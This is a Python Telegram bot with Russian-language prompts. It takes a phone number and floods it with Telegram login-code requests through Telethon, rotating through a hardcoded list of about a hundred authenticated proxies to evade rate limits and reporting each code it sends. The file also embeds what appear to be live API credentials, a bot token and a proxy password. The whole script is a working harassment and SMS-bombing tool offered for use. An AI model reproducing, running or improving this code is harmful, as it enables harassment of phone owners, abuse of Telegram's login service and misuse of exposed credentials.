import asyncio
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from telethon import TelegramClient
from telethon.errors import FloodWaitError
from telethon.network.connection import ConnectionTcpAbridged
import socks

API_ID = 35911533
API_HASH = "11dafcdc1514796c867055023716d39a"
BOT_TOKEN = "8830187981:AAGZu4sKhuTpTSI8sPgliF2lvXYJotP1k1s"

proxy_strings = [
"xa07h4pxkwx6:zj4egf2z4s6ricy@65.111.14.0:3129",
"xa07h4pxkwx6:zj4egf2z4s6ricy@209.50.163.33:3129",
"xa07h4pxkwx6:zj4egf2z4s6ricy@209.50.161.174:3129",
"xa07h4pxkwx6:zj4egf2z4s6ricy@209.50.185.174:3129",
"xa07h4pxkwx6:zj4egf2z4s6ricy@216.26.248.120:3129",
"xa07h4pxkwx6:zj4egf2z4s6ricy@104.167.25.128:3129",
"xa07h4pxkwx6:zj4egf2z4s6ricy@217.181.90.97:3129",
"xa07h4pxkwx6:zj4egf2z4s6ricy@45.3.44.221:3129",
"xa07h4pxkwx6:zj4egf2z4s6ricy@209.50.163.139:3129",
"xa07h4pxkwx6:zj4egf2z4s6ricy@104.207.56.56:3129",
"xa07h4pxkwx6:zj4egf2z4s6ricy@216.26.255.210:3129",
"xa07h4pxkwx6:zj4egf2z4s6ricy@209.50.168.110:3129",
"xa07h4pxkwx6:zj4egf2z4s6ricy@45.3.32.84:3129",
"xa07h4pxkwx6:zj4egf2z4s6ricy@104.207.34.161:3129",
"xa07h4pxkwx6:zj4egf2z4s6ricy@45.3.42.188:3129",
"xa07h4pxkwx6:zj4egf2z4s6ricy@45.3.62.143:3129",
"xa07h4pxkwx6:zj4egf2z4s6ricy@209.50.173.110:3129",
"xa07h4pxkwx6:zj4egf2z4s6ricy@216.26.229.56:3129",
"xa07h4pxkwx6:zj4egf2z4s6ricy@45.3.45.254:3129",
"xa07h4pxkwx6:zj4egf2z4s6ricy@65.111.24.145:3129",
"xa07h4pxkwx6:zj4egf2z4s6ricy@216.26.248.220:3129",
"xa07h4pxkwx6:zj4egf2z4s6ricy@104.207.56.49:3129",
"xa07h4pxkwx6:zj4egf2z4s6ricy@65.111.28.189:3129",
"xa07h4pxkwx6:zj4egf2z4s6ricy@209.50.163.222:3129",
"xa07h4pxkwx6:zj4egf2z4s6ricy@104.207.45.40:3129",
"xa07h4pxkwx6:zj4egf2z4s6ricy@45.3.34.179:3129",
"xa07h4pxkwx6:zj4egf2z4s6ricy@45.3.62.141:3129",
"xa07h4pxkwx6:zj4egf2z4s6ricy@104.207.46.158:3129",
"xa07h4pxkwx6:zj4egf2z4s6ricy@104.207.39.216:3129",
"xa07h4pxkwx6:zj4egf2z4s6ricy@104.207.60.114:3129",
"xa07h4pxkwx6:zj4egf2z4s6ricy@65.111.4.47:3129",
"xa07h4pxkwx6:zj4egf2z4s6ricy@104.167.25.35:3129",
"xa07h4pxkwx6:zj4egf2z4s6ricy@216.26.251.247:3129",
"xa07h4pxkwx6:zj4egf2z4s6ricy@209.50.188.35:3129",
"xa07h4pxkwx6:zj4egf2z4s6ricy@65.111.23.194:3129",
"xa07h4pxkwx6:zj4egf2z4s6ricy@216.26.226.134:3129",
"xa07h4pxkwx6:zj4egf2z4s6ricy@209.50.165.191:3129",
"xa07h4pxkwx6:zj4egf2z4s6ricy@104.207.47.2:3129",
"xa07h4pxkwx6:zj4egf2z4s6ricy@209.50.163.105:3129",
"xa07h4pxkwx6:zj4egf2z4s6ricy@209.50.178.157:3129",
"xa07h4pxkwx6:zj4egf2z4s6ricy@45.3.43.85:3129",
"xa07h4pxkwx6:zj4egf2z4s6ricy@104.207.40.46:3129",
"xa07h4pxkwx6:zj4egf2z4s6ricy@216.26.233.233:3129",
"xa07h4pxkwx6:zj4egf2z4s6ricy@216.26.255.232:3129",
"xa07h4pxkwx6:zj4egf2z4s6ricy@45.3.52.5:3129",
"xa07h4pxkwx6:zj4egf2z4s6ricy@216.26.233.77:3129",
"xa07h4pxkwx6:zj4egf2z4s6ricy@104.207.38.171:3129",
"xa07h4pxkwx6:zj4egf2z4s6ricy@45.3.37.77:3129",
"xa07h4pxkwx6:zj4egf2z4s6ricy@65.111.29.171:3129",
"xa07h4pxkwx6:zj4egf2z4s6ricy@209.50.179.152:3129",
"xa07h4pxkwx6:zj4egf2z4s6ricy@65.111.9.96:3129",
"xa07h4pxkwx6:zj4egf2z4s6ricy@209.50.183.147:3129",
"xa07h4pxkwx6:zj4egf2z4s6ricy@45.3.44.166:3129",
"xa07h4pxkwx6:zj4egf2z4s6ricy@209.50.165.33:3129",
"xa07h4pxkwx6:zj4egf2z4s6ricy@65.111.12.194:3129",
"xa07h4pxkwx6:zj4egf2z4s6ricy@104.207.36.6:3129",
"xa07h4pxkwx6:zj4egf2z4s6ricy@45.3.51.106:3129",
"xa07h4pxkwx6:zj4egf2z4s6ricy@209.50.189.162:3129",
"xa07h4pxkwx6:zj4egf2z4s6ricy@209.50.176.3:3129",
"xa07h4pxkwx6:zj4egf2z4s6ricy@45.3.49.239:3129",
"xa07h4pxkwx6:zj4egf2z4s6ricy@209.50.185.197:3129",
"xa07h4pxkwx6:zj4egf2z4s6ricy@209.50.189.143:3129",
"xa07h4pxkwx6:zj4egf2z4s6ricy@216.26.254.2:3129",
"xa07h4pxkwx6:zj4egf2z4s6ricy@209.50.175.52:3129",
"xa07h4pxkwx6:zj4egf2z4s6ricy@216.26.252.80:3129",
"xa07h4pxkwx6:zj4egf2z4s6ricy@104.207.33.111:3129",
"xa07h4pxkwx6:zj4egf2z4s6ricy@209.50.178.204:3129",
"xa07h4pxkwx6:zj4egf2z4s6ricy@209.50.183.108:3129",
"xa07h4pxkwx6:zj4egf2z4s6ricy@216.26.234.165:3129",
"xa07h4pxkwx6:zj4egf2z4s6ricy@216.26.255.40:3129",
"xa07h4pxkwx6:zj4egf2z4s6ricy@209.50.165.97:3129",
"xa07h4pxkwx6:zj4egf2z4s6ricy@216.26.228.188:3129",
"xa07h4pxkwx6:zj4egf2z4s6ricy@104.207.59.161:3129",
"xa07h4pxkwx6:zj4egf2z4s6ricy@209.50.181.251:3129",
"xa07h4pxkwx6:zj4egf2z4s6ricy@104.207.58.203:3129",
"xa07h4pxkwx6:zj4egf2z4s6ricy@104.207.33.150:3129",
"xa07h4pxkwx6:zj4egf2z4s6ricy@104.207.49.180:3129",
"xa07h4pxkwx6:zj4egf2z4s6ricy@104.207.62.83:3129",
"xa07h4pxkwx6:zj4egf2z4s6ricy@216.26.252.28:3129",
"xa07h4pxkwx6:zj4egf2z4s6ricy@216.26.252.87:3129",
"xa07h4pxkwx6:zj4egf2z4s6ricy@104.207.59.76:3129",
"xa07h4pxkwx6:zj4egf2z4s6ricy@193.56.28.100:3129",
"xa07h4pxkwx6:zj4egf2z4s6ricy@209.50.176.177:3129",
"xa07h4pxkwx6:zj4egf2z4s6ricy@209.50.174.75:3129",
"xa07h4pxkwx6:zj4egf2z4s6ricy@216.26.240.163:3129",
"xa07h4pxkwx6:zj4egf2z4s6ricy@195.63.31.47:3129",
"xa07h4pxkwx6:zj4egf2z4s6ricy@65.111.11.118:3129",
"xa07h4pxkwx6:zj4egf2z4s6ricy@209.50.181.71:3129",
"xa07h4pxkwx6:zj4egf2z4s6ricy@216.26.248.34:3129",
"xa07h4pxkwx6:zj4egf2z4s6ricy@209.50.185.76:3129",
"xa07h4pxkwx6:zj4egf2z4s6ricy@216.26.243.9:3129",
"xa07h4pxkwx6:zj4egf2z4s6ricy@65.111.24.234:3129",
"xa07h4pxkwx6:zj4egf2z4s6ricy@45.3.39.193:3129",
"xa07h4pxkwx6:zj4egf2z4s6ricy@209.50.177.13:3129",
"xa07h4pxkwx6:zj4egf2z4s6ricy@216.26.237.210:3129",
"xa07h4pxkwx6:zj4egf2z4s6ricy@104.207.35.239:3129",
"xa07h4pxkwx6:zj4egf2z4s6ricy@104.207.38.229:3129",
"xa07h4pxkwx6:zj4egf2z4s6ricy@216.26.237.197:3129",
"xa07h4pxkwx6:zj4egf2z4s6ricy@104.207.35.50:3129",
"xa07h4pxkwx6:zj4egf2z4s6ricy@65.111.9.230:3129"
]

proxy_list = []
for s in proxy_strings:
    login_pass, ip_port = s.split('@')
    login, password = login_pass.split(':')
    ip, port = ip_port.split(':')
    proxy_list.append({'login': login, 'password': password, 'ip': ip, 'port': int(port)})

spam_tasks = {}

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Отправь номер телефона в формате +7XXXXXXXXXX или +380XXXXXXXXX для спама кодами.")

async def stop_spam(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    if chat_id in spam_tasks:
        task, client = spam_tasks.pop(chat_id)
        if not task.done():
            task.cancel()
            try:
                await task
            except asyncio.CancelledError:
                pass
        await client.disconnect()
        await update.message.reply_text("Спам остановлен.")
    else:
        await update.message.reply_text("Нет активного спама.")

async def try_proxy(proxy, phone, chat_id, context):
    for proto in [socks.SOCKS5, socks.HTTP]:
        for attempt in range(3):
            try:
                proxy_tuple = (proto, proxy['ip'], proxy['port'], proxy['login'], proxy['password'])
                async with TelegramClient(None, API_ID, API_HASH, proxy=proxy_tuple, connection=ConnectionTcpAbridged, timeout=30) as temp_client:
                    await temp_client.connect()
                    await temp_client.send_code_request(phone)
                    return True
            except FloodWaitError as e:
                await context.bot.send_message(chat_id, f"FloodWait {e.seconds} сек на {proxy['ip']}")
                await asyncio.sleep(e.seconds)
                return True
            except Exception:
                if attempt == 2:
                    break
                await asyncio.sleep(0.5)
    return False

async def handle_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    phone = update.message.text.strip()
    chat_id = update.effective_chat.id
    if chat_id in spam_tasks:
        await update.message.reply_text("Уже идет спам для этого чата.")
        return

    client = TelegramClient(None, API_ID, API_HASH, connection=ConnectionTcpAbridged)
    await client.connect()

    async def spam():
        count = 0
        idx = 0
        while True:
            proxy = proxy_list[idx % len(proxy_list)]
            idx += 1
            success = await try_proxy(proxy, phone, chat_id, context)
            if success:
                count += 1
                await context.bot.send_message(chat_id, f"Отправлен код #{count} на номер {phone} через {proxy['ip']}")
            else:
                await context.bot.send_message(chat_id, f"Прокси {proxy['ip']} не отвечает, пропускаем.")
            await asyncio.sleep(0.5)

    task = asyncio.create_task(spam())
    spam_tasks[chat_id] = (task, client)
    await update.message.reply_text("Запущен спам с ротацией. Проверяем каждый прокси по два протокола.")

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("stop", stop_spam))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_phone))
    app.run_polling()

if __name__ == "__main__":
    main()
